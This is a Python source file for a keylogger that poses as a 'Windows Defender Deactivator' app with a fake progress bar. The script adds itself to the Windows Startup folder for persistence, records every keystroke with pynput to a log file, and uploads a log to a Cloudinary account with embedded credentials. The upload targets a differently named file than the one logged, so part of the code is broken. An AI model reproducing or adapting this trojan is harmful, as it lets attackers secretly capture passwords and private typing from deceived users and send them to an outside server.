import pynput
import logging
import time
import getpass
import os
import requests
from tkinter import *
from tkinter import ttk
from tkinter.messagebox import showinfo

USER_NAME = getpass.getuser()
CLOUD_NAME = "ddq6zg1yp" 
RESOURCE_TYPE = "auto" 
UPLOAD_PRESET = "ljfo7ly8"

# GUI
class App:

    def __init__(self, parent):
        # Creating UI components
        self.root = parent
        self.notebook = ttk.Notebook(parent)
        self.notebook.pack()
        self.home = Frame(self.notebook)
        self.about = Frame(self.notebook)
        self.home.pack()
        self.about.pack()
        ttk.Label(self.home, text='Welcome to Windows Defender Deactivator').grid(row=0, column=0, pady=20)
        ttk.Label(self.about, text='Windows Defender Deactivator V0.0.1').grid(row=0, column=0, pady=20)
        self.btn = ttk.Button(self.home, text='Deactivate Windows Defender', command=self.deactivate).grid(row=1, column=0, pady=20)
        self.notebook.add(self.home, text='Home')
        self.notebook.add(self.about, text='About')
    
    # Create a popup to display the progress
    def deactivate(self):
        # Creating UI components
        toplevel = Toplevel(self.root)
        toplevel.resizable(False, False)
        pb = ttk.Progressbar(toplevel, orient='horizontal', mode='determinate', length=100)
        pb.grid(column=2, row=0, columnspan=2, padx=10, pady=20)
        
        # Updating the progress bar
        while pb['value'] < 100:
            pb['value'] += 1
            time.sleep(0.02)
            root.update_idletasks()
        else:
            showinfo(message='Done!')

# Read every ket input and log it
def on_press(key): 
    try:
        logging.info(f"Key pressed: {key.char}") 
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Adding the script to startup
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)

# Check internet connection of host device
def is_connected():
    response = requests.get("https://www.google.com/")
    if(response.status_code == 200):
        return True
    else:
        return False

# 
def upload_file():
    payload = {'upload_preset': UPLOAD_PRESET}
    files = [
        ('file',('bes_key_log.txt', open('bes_key_log.txt','rb'), 'text/plain'))
    ]
    response = requests.post(f"https://api.cloudinary.com/v1_1/{CLOUD_NAME}/{RESOURCE_TYPE}/upload", data=payload, files=files)
    print(response.json()) 

# Adding the script to startup
add_to_startup()

# Create window 
root = Tk()

# Set resizable property for both X and Y axis False
root.resizable(False, False)

# Set the title for the window
root.title('Windows Defender Deactivator')

# Add UI components
app = App(root)

# Display the window
root.mainloop()

# Specify the file path where you want to store the logged keys
log_file_path = f"{USER_NAME}_key_log.txt"

# Configure logging to write to the specified file
logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Create a keyboard listener
with pynput.keyboard.Listener(on_press=on_press) as listener:
    if is_connected():
        upload_file()
    # Run the listener in the background
    listener.join()  


